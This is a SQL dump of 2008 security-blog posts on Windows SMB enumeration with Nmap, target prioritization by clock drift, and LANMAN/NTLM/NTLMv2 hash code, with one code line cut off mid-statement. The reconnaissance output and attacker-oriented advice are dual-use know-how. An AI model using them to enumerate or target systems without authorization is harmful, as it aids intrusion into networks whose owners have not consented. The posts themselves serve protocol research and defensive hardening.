INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (119, 'What does Windows tell its guests?', 'Ron Bowes', '2008-10-15', 'Hello everybody! \nLately I\'ve been putting a lot of work into Nmap scripts that\'ll probe Windows deeply for information. I\'m testing this with both authenticated and unauthenticated users, mostly to determine how well error conditions are handled. Every once in awhile, however, I notice something that the anonymous account or guest account can access that seems odd. And today, I felt like I ought to post a blog, so you get to hear about it!\n\nFirst, a little background. Users have two ways they can anonymously log into Windows through SMB:\n\nThe \'anonymous\' account, also known as the infamous \'null session\', where a blank username/blank password are used for credentials\n\nThe \'guest\' account, which is disabled by default\n\nThe \'guest\' account has an additional interesting property -- if a user mistypes his or her username, and the \'guest\' account is enabled, the system will automatically allow access as \'guest\'. I suspect that this was done for user friendliness -- \"oh, you don\'t have an account? Well come on in, you can have a little bit of access!\" -- but in the end, I could see it being more annoying than anything. \"Why can\'t I access my files after logging in?\" Additionally, some versions of Windows (Windows XP Professional, for example) will always log in users as the \'guest\' account, I\'m assuming for security reasons (this behaviour is something that me and David from the Nmap-dev mailing list spent some time troubleshooting). This can be changed by modifying the local security policy, but I digress. \nSo anyway, those are the two anonymous accounts, so to speak. Every Windows system will allow an anonymous login, with minimal access, and every Windows system has a guest account, disabled by default. \nWindows 2000, by default, gives so much information to the anonymous account that it isn\'t even funny:\nHost script results: \r\n|  SMB Security: User-level authentication\r\n|  SMB Security: Challenge/response passwords supported\r\n|_ SMB Security: Message signing not supported\r\n|  MSRPC: List of domains:\r\n|  Domain: BASEWIN2K\r\n|   |_ SID: S-1-5-21-1060284298-842925246-839522115\r\n|   |_ Users: Administrator, ASPNET, blankadmin, blankuser, Guest, Ron, test\r\n|   |_ Creation time: 2006-10-17 15:35:07\r\n|   |_ Passwords: min length: n/a; min age: n/a; max age: 42 days\r\n|   |_ Account lockout disabled\r\n|   |_ Password properties:\r\n|     |_  Password complexity requirements do not exist\r\n|     |_  Administrator account cannot be locked out\r\n|  Domain: Builtin\r\n|   |_ SID: S-1-5-32\r\n|   |_ Users:\r\n|   |_ Creation time: 2006-10-17 15:35:07\r\n|   |_ Passwords: min length: n/a; min age: n/a; max age: 42 days\r\n|   |_ Account lockout disabled\r\n|   |_ Password properties:\r\n|     |_  Password complexity requirements do not exist\r\n|_    |_  Administrator account cannot be locked out\r\n|  OS from SMB: Windows 2000\r\n|  LAN Manager: Windows 2000 LAN Manager\r\n|  Name: WORKGROUP\\BASEWIN2K\r\n|_ System time: 2008-10-13 21:18:05 UTC-5\r\n|  MSRPC: NetSessEnum():\r\n|  ERROR: Couldn\'t enumerate login sessions: NT_STATUS_ACCESS_DENIED\r\n|  Active SMB Sessions:\r\n|_ |_  is connected from 192.168.1.3 for [just logged in, it\'s probably you], idle for [not idle]\r\n|  MSRPC: NetShareEnumAll():\r\n|  Anonymous shares: IPC$\r\n|_ Restricted shares: ADMIN$, C$\r\n|  MSRPC: List of user accounts:\r\n|  Administrator\r\n|    |_ Domain: BASEWIN2K\r\n|    |_ RID: 500\r\n|    |_ Full name: Built-in account for administering the computer/domain\r\n|    |_ Flags: Normal account, Password doesn\'t expire\r\n|  ASPNET\r\n|    |_ Domain: BASEWIN2K\r\n|    |_ RID: 1001\r\n|    |_ Full name: Account used for running the ASP.NET worker process (aspnet_wp.exe)\r\n|    |_ Description: ASP.NET Machine Account\r\n|    |_ Flags: Normal account, Password not required, Password doesn\'t expire\r\n|  blankadmin\r\n|    |_ Domain: BASEWIN2K\r\n|    |_ RID: 1003\r\n|    |_ Flags: Normal account\r\n|  blankuser\r\n|    |_ Domain: BASEWIN2K\r\n|    |_ RID: 1004\r\n|    |_ Flags: Normal account\r\n|  Guest\r\n|    |_ Domain: BASEWIN2K\r\n|    |_ RID: 501\r\n|    |_ Full name: Built-in account for guest access to the computer/domain\r\n|    |_ Flags: Normal account, Password not required, Password doesn\'t expire\r\n|  Ron\r\n|    |_ Domain: BASEWIN2K\r\n|    |_ RID: 1000\r\n|    |_ Description: Ron\r\n|    |_ Flags: Normal account, Password doesn\'t expire\r\n|  test\r\n|    |_ Domain: BASEWIN2K\r\n|    |_ RID: 1002\r\n|_   |_ Flags: Normal account\r\n\nWe have a list of user accounts, sessions, domain policies, etc. etc. etc. Yes, it\'s fun to find Windows 2000 machines, that\'s for sure! \nWindows 2003, on the other hand, gives very little information to the anonymous account. Here is the output of my current plugins:\nHost script results:\r\n|  SMB Security: User-level authentication\r\n|  SMB Security: Challenge/response passwords supported\r\n|_ SMB Security: Message signing not supported\r\n|  OS from SMB: Windows Server 2003 3790 Service Pack 2\r\n|  LAN Manager: Windows Server 2003 5.2\r\n|  Name: WORKGROUP\\BASEWIN2K3\r\n|_ System time: 2008-10-15 21:12:44 UTC-5\r\n|_ MSRPC: List of domains: ERROR: NT_STATUS_ACCESS_DENIED (samr.connect4)\r\n|  MSRPC: NetSessEnum():\r\n|  ERROR: Couldn\'t enumerate login sessions: NT_STATUS_ACCESS_DENIED\r\n|_ ERROR: Couldn\'t enumerate network sessions: NT_STATUS_ACCESS_DENIED\r\n|  MSRPC: List of user accounts:\r\n|  Enum via LSA error: NT_STATUS_ACCESS_DENIED (lsa.openpolicy2)\r\n|  Enum via SAMR error: NT_STATUS_ACCESS_DENIED (samr.connect4)\r\n|_ Sorry, couldn\'t find any account names anonymously!\r\n|  MSRPC: NetShareEnumAll():\r\n|  Couldn\'t enum all shares, checking for common ones (NT_STATUS_ACCESS_DENIED)\r\n|  Anonymous shares: IPC$\r\n|_ Restricted shares: ADMIN$, C$\r\n\nSo, we get a little information about what type of password is expected, which is necessary. Then we get the operating system version, system time, and system name. Ok, that isn\'t too bad. \nNow, when the \'guest\' account is enabled, what kind of information do we get?\nHost script results:\r\n|  SMB Security: User-level authentication\r\n|  SMB Security: Challenge/response passwords supported\r\n|_ SMB Security: Message signing not supported\r\n|  OS from SMB: Windows Server 2003 3790 Service Pack 2\r\n|  LAN Manager: Windows Server 2003 5.2\r\n|  Name: WORKGROUP\\BASEWIN2K3\r\n|_ System time: 2008-10-15 21:30:15 UTC-5\r\n|  MSRPC: NetShareEnumAll():  \r\n|  Anonymous shares: IPC$\r\n|_ Restricted shares: C$, ADMIN$\r\n|  MSRPC: List of user accounts:  \r\n|  Enum via SAMR error: NT_STATUS_ACCESS_DENIED (samr.opendomain)\r\n|  Administrator\r\n|    |_ Domain: BASEWIN2K3\r\n|    |_ RID: 500\r\n|  blankadmin\r\n|    |_ Domain: BASEWIN2K3\r\n|    |_ RID: 1011\r\n|  blankuser\r\n|    |_ Domain: BASEWIN2K3\r\n|    |_ RID: 1012\r\n|  consoletest\r\n|    |_ Domain: BASEWIN2K3\r\n|    |_ RID: 1010\r\n|  Guest\r\n|    |_ Domain: BASEWIN2K3\r\n|    |_ RID: 501\r\n|  HelpServicesGroup\r\n|    |_ Domain: BASEWIN2K3\r\n|    |_ RID: 1003\r\n|  ron\r\n|    |_ Domain: BASEWIN2K3\r\n|    |_ RID: 1009\r\n|  SUPPORT_388945a0\r\n|    |_ Domain: BASEWIN2K3\r\n|    |_ RID: 1004\r\n|  TelnetClients\r\n|    |_ Domain: BASEWIN2K3\r\n|    |_ RID: 1005\r\n|  test\r\n|    |_ Domain: BASEWIN2K3\r\n|_   |_ RID: 1007\r\n|  MSRPC: NetSessEnum():  \r\n|  Users logged in:\r\n|  |_ BASEWIN2K3\\ron, logged in since 2008-10-13 17:10:51 [testing -- may not be accurate]\r\n|_ ERROR: Couldn\'t enumerate network sessions: NT_STATUS_WERR_ACCESS_DENIED (srvsvc.netsessenum)\r\n\nWith the guest account, we get a list of users (although we don\'t get details on them -- we only get users by bruteforcing RIDs, which I\'ll talk about in another blog), an actual list of the shares on the system (which, in this case, happens to be identical to the list of shares we brute forced with the anonymous account -- something I may blog about in the future), and the list of users logged in. \nThis last one is curious -- where is the list of users logged in coming from? Let\'s look at the output of \"smb-enumsessions\" for Windows 2000, with the anonymous account:\nHost script results:\r\n|  MSRPC: NetSessEnum():  \r\n|  ERROR: Couldn\'t enumerate login sessions: NT_STATUS_ACCESS_DENIED\r\n|  Active SMB Sessions:\r\n|_ |_  is connected from 192.168.1.3 for [just logged in, it\'s probably you], idle for [not idle]\r\n\nCompared to Windows 2003, with the guest account:\nHost script results:\r\n|  MSRPC: NetSessEnum():  \r\n|  Users logged in:\r\n|  |_ BASEWIN2K3\\ron, logged in since 2008-10-13 17:10:51 [testing -- may not be accurate]\r\n|_ ERROR: Couldn\'t enumerate network sessions: NT_STATUS_WERR_ACCESS_DENIED (srvsvc.netsessenum)\r\n\nSo, on Windows 2000, \'anonymous\' can enumerate SMB sessions, but not user sessions. On Windows 2003, \'guest\' can enumerate user sessions but not SMB sessions. What\'s going on? First, a little background on how this works.  \nEnumerating SMB sessions is a call to the NetSessEnum() function in the server service (SRVSVC). This is the same service that is used for enumerating shares (NetShareEnumAll()). So, we aren\'t allowed this SRVSVC call against Windows 2003 without a proper user account. That\'s fine. \nThe next part is where it gets interesting -- enumerating login sessions is done by reading the registry (WINREG). Specifically, enumerating the keys under HKEY_USERS. Each key under HKEY_USERS is the SID of a currently logged in user. A SID is a series of numbers that look like, \"S-1-5-21-1060284298-842925246-839522115-1003\". In this case, the first part is the domain (\"S-1-5-21-1060284298-842925246-839522115\") and the last part is the users\'s RID (\"1003\"). The RID can be translated back to a username using a LSA function, LsaLookupSids2() (the Lsa functions all have \'2\' on the end due to a typo in the parameters for the original ones. True story). \nTo summaring, here are the functions called to retrieve the list of users:\n\nwinreg.OpenHKU()\nwinreg.EnumKey()\nlsa.OpenPolicy2()\nlsa.LookupSids2()\n\nWindows 2000 heads us off at the pass -- we are denied access as soon as we try looking at the Windows registry. But 2003 will let us open up the registry and take a look around, if we have \'guest\'. I\'m assuming that Windows XP will, as well, and some versions of XP seem to have \'guest\' enabled by default. \nAs I get deeper into MSRPC, I will explore what the Guest account can actually do. But, that\'s all I have for now. Hopefully it wasn\'t too much of a ramble! :)', '\'NetBIOS/SMB\'', 'https://blog.skullsecurity.org/2008/83');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (120, 'What time IS it?', 'Ron Bowes', '2008-10-1', 'How synced up are the clocks on your servers? Ignoring your system times may give an important clue to attackers. Read on to find out more!\n\nMy first script addition to Nmap was, as you\'ll recall if you read my previous post, an addition to the SMB script that would pull the system time over SMB. While testing other scripts today, I had an idea -- scan a random subnet and see how synchronized the clocks are. \nWell, I only tried it with one class C, and here are my results:\n$ ./nmap --script=smb-os-discovery.nse xxx.xxx.xxx.xxx/24 -p 139,445 \\\r\n        | grep \"System time\" \\\r\n        | sort -r\r\n|_ System time: 2008-10-01 11:32:37 UTC-5\r\n|_ System time: 2008-10-01 11:29:24 UTC-5\r\n|_ System time: 2008-10-01 10:09:19 UTC-5\r\n|_ System time: 2008-10-01 10:04:45 UTC-5\r\n|_ System time: 2008-10-01 10:04:28 UTC-5\r\n|_ System time: 2008-10-01 10:04:25 UTC-7\r\n|_ System time: 2008-10-01 10:04:25 UTC-5\r\n|_ System time: 2008-10-01 10:04:25 UTC-5\r\n|_ System time: 2008-10-01 10:04:25 UTC-5\r\n|_ System time: 2008-10-01 10:04:25 UTC-5\r\n|_ System time: 2008-10-01 10:04:25 UTC-5\r\n|_ System time: 2008-10-01 10:04:25 UTC-5\r\n|_ System time: 2008-10-01 10:04:25 UTC-5\r\n|_ System time: 2008-10-01 10:04:23 UTC-7\r\n|_ System time: 2008-10-01 10:04:20 UTC-5\r\n|_ System time: 2008-10-01 00:37:41 UTC-5\r\n|_ System time: 2008-06-01 17:13:33 UTC-7\r\n\nTo summarize: 11 servers out of 17 that responded came back with roughly the proper time, and 14 were in the proper timezone. A couple are off by an hour or so, one thought it was midnight, and one thought it was June. Maybe it misses the summer? \nNow, if I\'m an attacker, which server would have the highest priority? The ones that are synced up to the proper time, or the one that thinks it\'s June? Which one do you think is watched more carefully by administrators, or used more frequently by users?\nOf course, I took the obvious choice. From a quick look, the system turned out to be Windows 2003 SP0. No service packs. And I\'m willing to put money that if I loaded up Metasploit and threw a couple oldschool exploits at it (MS04-011 anybody?), I\'d be in in no time.\nSo there you have it -- if you\'re looking for a way to prioritize targets on a network, take a look at the system time. The further out of sync it is, the more likely you\'ve found a server that\'s been forgotten. And forgotten servers often aren\'t monitored or updated as frequently as others.', '\'Hacking\', \'NetBIOS/SMB\'', 'https://blog.skullsecurity.org/2008/what-time-is-it');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (121, 'My Scripting Experience with Nmap', 'Ron Bowes', '2008-9-14', 'As you can see from my past few posts, I\'ve been working on implementing an SMB client in C. Once I got that into a stable state, I decided to pursue the second part of my goal for a bit -- porting that code over to an Nmap script. Never having used Lua before, this was a little intimidating. So, to get my feet wet, I modified an existing script -- netbios-smb-os-discovery.nse -- to have a little bit of extra functionality:\n\n-----------------------------------------------------------------------\r\n-- Response from Negotiate Protocol Response (TCP payload 2)\r\n-- Must be SMB response.  Extract the time from it from a fixed\r\n-- offset in the payload.\r\n\r\nfunction extract_time(line)\r\n\r\n    local smb, tmp, message, i, timebuf, timezonebuf, time, timezone\r\n\r\n    message = 0\r\n\r\n    if(string.sub(line, 6, 8) ~= \"SMB\") then\r\n        message = \"Didn\'t find correct SMB record as a response to the \\\r\n                        Negotiate Protocol Response\"\r\n        return 0, message\r\n    end\r\n\r\n    if(string.byte(line, 9) ~= 0x72) then\r\n        message = \"Incorrect Negotiate Protocol Response type\"\r\n        return 0, message\r\n    end\r\n\r\n    -- Extract the timestamp from the response\r\n    i = 1\r\n    time = 0\r\n    timebuf = string.sub(line, 0x3d, 0x3d + 7)\r\n    while (i <= 8) do\r\n        time = time + 1.0 + (bit.lshift(string.byte(timebuf, i), 8 * (i - 1)))\r\n        i = i + 1\r\n    end\r\n    -- Convert time from 1/10 microseconds to seconds\r\n    time = (time / 10000000) - 11644473600;\r\n\r\n    -- Extract the timezone offset from the response\r\n    timezonebuf = string.sub(line, 0x45, 0x45 + 2)\r\n    timezone = (string.byte(timezonebuf, 1) + \r\n                     (bit.lshift(string.byte(timezonebuf, 2), 8)))\r\n\r\n    -- This is a nasty little bit of code, so I\'ll explain it in detail. \r\n    -- If the timezone has the \r\n    -- highest-order bit set, it means it was negative. If \r\n    -- so, we want to take the two\'s complement\r\n    -- of it (not(x)+1) and divide by 60, to get minutes. \r\n    -- Otherwise, just divide by 60. \r\n    -- To further complicate things (as if we needed \r\n    -- _that_!), the timezone offset is the number of\r\n    -- minutes you\'d have to add to the time to get to \r\n    -- UTC, so it\'s actually the negative of what\r\n    -- we want. Confused yet?\r\n    if(timezone == 0x00) then\r\n        timezone = \"UTC+0\"\r\n    elseif(bit.band(timezone, 0x8000) == 0x8000) then\r\n        timezone = \"UTC+\" .. ((bit.band(bit.bnot(timezone), 0x0FFFF) + 1) / 60)\r\n    else\r\n        timezone = \"UTC-\" .. (timezone / 60)\r\n    end\r\n\r\n    return (os.date(\"%Y-%m-%d %H:%M:%S\", time) .. \" \" .. timezone), message;\r\n\r\nend\r\n\nThis function is a little sloppy, in my opinion, and it was clear that I was just feeling my way around the language. I had an especially difficult time trying to convert the time using 64-bit values, because I was getting integer overflows (or so I thought -- it turned that I was displaying as a 32-bit signed integer, so I was getting 0x7FFFFFFF, but Lua was actually storing it as the correct 64-bit value). That\'s one reason I dislike weakly typed languages, but that\'s ok. \nIn the original script (not written by me), the packets were being built like this:\nrec1_payload = string.char(0x81, 0x00, 0x00, 0x44) .. ename  ..  winshare\n(longer packets were, of course, much worse)\nThere are a few problems with this method, including:\n\nIt\'s difficult to read\nIt\'s difficult to modify\nUnicode was being negotiated in a language that doesn\'t handle Unicode (that I\'m aware of)\n\nWhen this was written, however, there was no really clean way to build packets, so this was a reasonable strategy. Seeing as how the pack() and unpack() functions were since created, and I\'ve gained myself a comfort level working in SMB, I decided to re-write building packets like this:\n    local header = bin.pack(\"\nAs you can see, this is much cleaner (and is also a different packet). \nAfter awhile, I had some working code that I posted to the mailing list. The response to it was positive, and it was even suggested by one of the developers that I turn it into a nselib library. Still being new to Lua, this was yet another seemingly difficult task! \nDespite the natural fear of the unknown, I started opening other nselib files, and looking at how they worked. And, as it turned out, they were just normal lua files with a single line at the front (a call to module() that I don\'t really understand). So, I started rearranging my code and pulling things together, and, before I knew it, I had a netbios and smb library! \nJust for fun, here\'s the interface for my netbios library:\n\r\nfunction name_encode(name, scope)\r\nfunction name_decode(encoded_name)\r\nfunction get_names(host, prefix)\r\nfunction get_server_name(host, names)\r\nfunction get_user_name(host, names)\r\nfunction do_nbstat(host)\r\nfunction flags_to_string(flags)\r\n\nAnd the SMB interface:\n\r\nfunction get_port(host)\r\nfunction start(host)\r\nfunction stop(socket, uid, tid) \r\nfunction start_raw(host, port)\r\nfunction start_netbios(host, port, name)\r\nfunction smb_send(socket, header, parameters, data)\r\nfunction smb_read(socket)\r\nfunction negotiate_protocol(socket)\r\nfunction start_session(socket, username, session_key, capabilities)\r\nfunction tree_connect(socket, path, uid)\r\nfunction tree_disconnect(socket, uid, tid)\r\nfunction logoff(socket, uid)\r\n\nSo, the bottom line is that I\'ve picked up Lua quite quickly and have been quickly porting my C code to Lua. Woohoo! \nAnd if you\'re curious, you can get the full source to nmap stuff on my SVN server.', '\'NetBIOS/SMB\'', 'https://blog.skullsecurity.org/2008/scripting-with-nmap');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (122, 'NTLMv2, as promised, plus some random SMB stuff!', 'Ron Bowes', '2008-9-2', 'Last post, I promised I\'d post about NTLMv2 once I got it implemented. And, here we are. \nThe LMv2 and NTLMv2 responses are a little bit trickier than the first versions, although most of my trouble was trying to figure out how to use HMAC-MD5 in OpenSSL. The good news is that LMv2 and NTLMv2 are almost identical to each other, with only one minor difference.\n\nImplementation\nLMv2 and NTLMv2 require the following values:\n\nThe NTLM hash (MD4 of the Unicode password)\nUsername (uppercase Unicode)\nDomain (uppercase Unicode, supposedly1)\nClient challenge (a random string2)\n\nLMv2: 8 bytes\nNTLMv2: 10+ bytes (up to 24 bytes on Vista)\n\nServer challenge (8 bytes)\n\nOnce you have those values, the formula is simple:\nv2hash = HMAC-MD5(v1hash, concat(username, domain_name));\r\nresponse = HMAC-MD5(v2hash, concat(server_challenge, client_challenge));\nThe only difference between LMv2 and NTLMv2 is the length of the client challenge. \nHere is the code for generating v2hash using the OpenSSL library (note that I called the client challenge the \"blob\", and that I\'m not randomizing it; if you want a secure implementation, it should be random):\nvoid ntlmv2_create_hash(const uint8_t ntlm[16], const char *username, \r\n    const char *domain, uint8_t hash[16])\r\n{\r\n    size_t username_length = strlen(username);\r\n    size_t domain_length   = strlen(domain);\r\n    char    *combined;\r\n    uint8_t *combined_unicode;\r\n\r\n    /* Probably shouldn\'t do this, but this is all prototype so eh? */\r\n    if(username_length > 256 || domain_length > 256)\r\n        DIE(\"username or domain too long.\");\r\n\r\n    /* Combine the username and domain into one string. */\r\n    combined = malloc(username_length + domain_length + 1);\r\n    memset(combined, 0, username_length + domain_length + 1);\r\n\r\n    memcpy(combined,                   username, username_length);\r\n    memcpy(combined + username_length, domain,   domain_length);\r\n\r\n    /* Convert to Unicode. */\r\n    combined_unicode = (uint8_t*)unicode_alloc_upper(combined);\r\n\r\n    /* Perform the Hmac-MD5. */\r\n    HMAC(EVP_md5(), ntlm, 16, combined_unicode, (username_length + \r\n        domain_length) * 2, hash, NULL);\r\n\r\n    free(combined_unicode);\r\n    free(combined);\r\n}\r\n\nAnd here\'s the code for creating the full LMv2/NTLMv2 response:\nvoid ntlmv2_create_response(const uint8_t ntlm[16], const char *username, \r\n    const char *domain, const uint8_t challenge[8], uint8_t *result, \r\n    uint8_t *result_size)\r\n{\r\n    size_t  i;\r\n    uint8_t v2hash[16];\r\n    uint8_t *data;\r\n\r\n    uint8_t blip[8];\r\n    uint8_t *blob;\r\n    uint8_t blob_length;\r\n\r\n    /* Create the \'blip\'. TODO: Do I care if this is random? */\r\n    for(i = 0; i < 8; i++)\r\n        blip[i] = i;\r\n\r\n    if(*result_size < 24)\r\n    {\r\n        /* Result can\'t be less than 24 bytes. */\r\n        DIE(\"Result size is too low!\");\r\n    }\r\n    else if(*result_size == 24)\r\n    {\r\n        /* If they\'re looking for 24 bytes, then it\'s just the raw blob. */\r\n        blob = malloc(8);\r\n        memcpy(blob, blip, 8);\r\n        blob_length = 8;\r\n    }\r\n    else\r\n    {\r\n        blob = malloc(24);\r\n        for(i = 0; i < 24; i++)\r\n            blob[i] = i;\r\n        blob_length = 24;\r\n    }\r\n\r\n    /* Allocate room enough for the server challenge and the client blob. */\r\n    data = malloc(8 + blob_length);\r\n\r\n    /* Copy the challenge into the memory. */\r\n    memcpy(data, challenge, 8);\r\n    /* Copy the blob into the memory. */\r\n    memcpy(data + 8, blob, blob_length);\r\n\r\n    /* Get the v2 hash. */\r\n    ntlmv2_create_hash(ntlm, username, domain, v2hash);\r\n\r\n    /* Generate the v2 response. */\r\n    HMAC(EVP_md5(), v2hash, 16, data, 8 + blob_length, result, NULL);\r\n\r\n    /* Copy the blob onto the end of the v2 response. */\r\n    memcpy(result + 16, blob, blob_length);\r\n\r\n    /* Store the result size. */\r\n    *result_size = blob_length + 16;\r\n\r\n    /* Finally, free up the memory. */\r\n    free(data);\r\n    free(blob);\r\n}\r\n\nAs with my previous post, the code I\'m presenting here is straight from my nbtool code, this time revision 180. Here is the code you need (along with the header file and types.h). Compile them with -DTEST and -lssl/-lcrypto, and you\'re set! \nWhat\'s the point?\nSo, the main difference between NTLMv1 and NTLMv2 is that a \"client challenge\" is incorporated. So, what\'s that buy us?\nThe main reason for adding some client randomness, I would guess, is to help prevent pre-computed password attacks from a malicious server. A malicious server can pre-compute the most common password hashes for a given server challenge, then send that challenge to every user. \nAlso, for what it\'s worth, this is very similar conceptually to the client token/server token on Battle.net logins, for all you Battle.net people. \nHow to enable\nWindows, by default, sends both LANMAN and NTLM to the server, and the server accepts both. If you require more security, you should configure your client/server to only send/accept v2 responses. Microsoft\'s documentation on how to change this can be found here, which boils down to this: change or create this DWORD value, taking the usual precautions to not screw up your registry:\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\LmCompatibilityLevel\nTo:\n\n0 -- Client: LM/NTLM. Server: LM, NTLM, and NTLMv2.\n1 -- Client: LM/NTLM, session security. Server: LM, NTLM, and NTLMv2.\n2 -- Client: NTLM, session security. Server: LM, NTLM, and NTLMv2.\n3 -- Client: NTLMv2, session security. Server: LM, NTLM, and NTLMv2.\n4 -- Client: NTLMv2, session security. Server: NTLM and NTLMv2.\n5 -- Client: NTLMv2, session security. Server: NTLMv2.\n\nNote that I haven\'t talked about session security at all. That\'s something I plan to do in the near future, and I\'ll definitely post about it when I do. \nRandom SMB stuff\nAs promised by the blog\'s title title, this section is for some random SMB stuff! \nThe random stuff happens to be the, you guessed it, the standard login sequence! There are three messages involved:\n\nSMB_COM_NEGOTIATE\n\nClient sends a list of protocols it understands\nServer responds with its protocol choice, a bunch of its capabilities/settings, and its challenge value (used when creating the login response hashes)\n\nSMB_COM_SESSION_SETUP_ANDX\n\nClient sends its username, domain, and hashed password(s); the hashes can be in any format the server supports, from plaintext to NTLMv2; the server will check every possibility.\nServer responds with either the UID (User ID) for the session, or an error, depending on if a valid username/password was given; it also informs the client if its username was incorrect, resulting in being logged in as \'GUEST\'3.\n\nSMB_COM_TREE_CONNECT_ANDX\n\nClient sends the tree it wishes to connect to (eg, \"IPC$\" for special communications, \"C$\" for the hidden C drive share, \"KITTEN\" for a share called \"KITTEN\", etc).\nServer responds with the TID (Tree ID) for the session, or with an error, depending on whether the user has the appropriate privileges.\n\n\nIf you want to see any of that in action, grab a copy of Wireshark and connect to a network share (\"c:\\> net use * \\\\server\\c$ /u:username\"). \nFootnotes\n1 From my experiments, the domain has to be in whichever case you sent it during the login, not uppercase. To avoid this problem, I convert the domain to uppercase immediately after the user inputs it.\n2 The documentation I read described a specific structure that NTLMv2 required for the client challenge; this structure worked as well as a random string except on Vista, where I couldn\'t use a client challenge longer than 24 bytes and therefore was forced to use the random string. If anybody knows why, I\'d be curious to hear it!\n3 That\'s right -- if you mistype your username, and the remote machine has the \'GUEST\' account enabled, you\'re automatically logged in as the GUEST account. When user friendliness attacks?', '\'NetBIOS/SMB\'', 'https://blog.skullsecurity.org/2008/ntlmv2-as-promised-plus-some-random-smb-stuff');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (123, 'LANMAN and NTLM: Not as complex as you think!', 'Ron Bowes', '2008-8-31', 'As I\'m sure you\'ve noticed with my first two posts, my NetBIOS/SMB project is taking up most of my time. I hit a bump this weekend, and almost got to the point where the only valid answer was throwing things; luckily, however, I figured it out. I did make a new enemy, though: signed data types! The devil\'s datatype.\n\nBut sour grapes (and, naturally, joking) aside, I just finished implementing the two older (and, by far, most common) Windows authentication hashes: LANMAN and NTLM. I\'m also planning on implementing NTLMv2 in the near future, so stay tuned for that. LANMAN and NTLM are used by default on Windows, though, so you\'re far more likely to see them. \nIn the past, I\'ve always feared LANMAN and NTLM, thinking that there was something inherently complex and tricky about them. However, once I got around to implementing them, I realized that they\'re dead simple! Nothing to it! They\'re so simple, in fact, that they\'re the perfect topic for a blog post. \nThe code I\'m presenting here is straight from my nbtool code. The particular SVN revision is 169, but the code should basically be static now. Here is the code you need (along with the header file and types.h). Compile them with -DTEST and -lssl/-lcrypto, and you\'re set! \nQuick intro\nIf you\'re reading this, you should have some idea what LANMAN and NTLM are, and some knowledge of NetBIOS/SMB are helpful as well. But, in case you don\'t, here\'s a quick summary:\n\nLANMAN: The original way Windows stored passwords\nNTLM: A slightly more modern way that Windows stores passwords\nNetBIOS/SMB: The protocol used by Windows for filesharing, RPC, and lots more\n\nFor more info, consult Wikipedia, etc. \nLANMAN hash\nThe first thing I\'ll go over is how to create a LANMAN hash. Many of you probably know it as the easiest hash in history to crack. That\'d be the one! In short, here\'s how to generate it:\n\nConvert password to uppercase.\nMake the password exactly 14 characters, either by truncating or padding with NULL bytes (\'\\0\').\nSplit into two 7-character (56-bit) passwords\nConvert each of those passwords into a 64-bit DES key, by adding a parity bit to the end of each byte (I\'ll have some code later)\nEncrypt the string \"KGS!@#$%\" with each of the two keys, generating two 8-byte encrypted strings\nConcatenate those two strings to form a 16-byte string\n\nThat 16-byte string is the LANMAN hash that\'s stored in the SAM file (among other places). \nHere is the code for converting the 56-bit string into the 64-bit key:\nstatic void password_to_key(const uint8_t password[7], uint8_t key[8])\r\n{\r\n    /* make room for parity bits */\r\n    key[0] =                        (password[0] >> 0);\r\n    key[1] = ((password[0]) << 7) | (password[1] >> 1);\r\n    key[2] = ((password[1]) << 6) | (password[2] >> 2);\r\n    key[3] = ((password[2]) << 5) | (password[3] >> 3);\r\n    key[4] = ((password[3]) << 4) | (password[4] >> 4);\r\n    key[5] = ((password[4]) << 3) | (password[5] >> 5);\r\n    key[6] = ((password[5]) << 2) | (password[6] >> 6);\r\n    key[7] = ((password[6]) << 1);\r\n}\r\n\nNote: the password HAS to be unsigned for this to work! Trust me! If you used signed data types, it\'ll work fine until you try hashing binary data, then it won\'t work and you\'ll want to throw things. \nAfter that, the rest is easy:\nvoid lm_create_hash(const char *password, uint8_t result[16])\r\n{   \r\n    size_t           i;\r\n    uint8_t          password1[7];\r\n    uint8_t          password2[7];\r\n    uint8_t          kgs[] = \"KGS!@#$%\";\r\n    uint8_t          hash1[8];\r\n    uint8_t          hash2[8];\r\n\r\n    /* Initialize passwords to NULLs. */\r\n    memset(password1, 0, 7);  \r\n    memset(password2, 0, 7);\r\n\r\n    /* Copy passwords over, convert to uppercase, they\'re automatically padded with NULLs. */\r\n    for(i = 0; i < 7; i++)\r\n    {\r\n        if(i < strlen(password))\r\n            password1[i] = toupper(password[i]);\r\n        if(i + 7 < strlen(password))\r\n            password2[i] = toupper(password[i + 7]);\r\n    }\r\n\r\n    /* Do the encryption. */\r\n    des(password1, kgs, hash1);\r\n    des(password2, kgs, hash2);\r\n\r\n    /* Copy the result to the return parameter. */\r\n    memcpy(result + 0, hash1, 8);\r\n    memcpy(result + 8, hash2, 8);\r\n}\r\n\nAnd here\'s the DES function, which uses OpenSSL functions (don\'t worry if this is confusing, it was also confusing to me, at first):\nstatic void des(const uint8_t password[7], const uint8_t data[8], uint8_t result[])\r\n{   \r\n    DES_cblock key;\r\n    DES_key_schedule schedule;\r\n\r\n    password_to_key(password, key);\r\n\r\n    DES_set_odd_parity(&key);\r\n    DES_set_key_unchecked(&key, &schedule);\r\n    DES_ecb_encrypt((DES_cblock*)data, (DES_cblock*)result, &schedule, DES_ENCRYPT);\r\n}  \nThat\'s all there is to it! \nNTLM hash\nThe NTLM hash is the other hash value that\'s stored in the SAM file. It\'s used for authentication in addition to LANMAN. Although it isn\'t stored in an easily crackable format, it does have one fatal flaw: it is almost always sent (and stored) alongside the LANMAN hash, for backwards compatibility, making any added security completely irrelevant. \nGenerating the NTLM hash is far easier than a LANMAN hash. It is simply an MD4() of the password (in Unicode). Here is the code (note that I\'m doing the Unicode in an incredibly inefficient way, but for the purposes of short code, it\'s the quickest way to demonstrate):\nvoid ntlm_create_hash(const char *password, uint8_t result[16])\r\n{\r\n    size_t i;\r\n    MD4_CTX ntlm;\r\n    MD4_Init(&ntlm);\r\n    for(i = 0; i < strlen(password); i++)\r\n    {\r\n        MD4_Update(&ntlm, password + i, 1);\r\n        MD4_Update(&ntlm, \"\",           1);\r\n    }  \r\n    MD4_Final(result, &ntlm);\r\n}\r\n\nAgain, this uses the OpenSSL library. 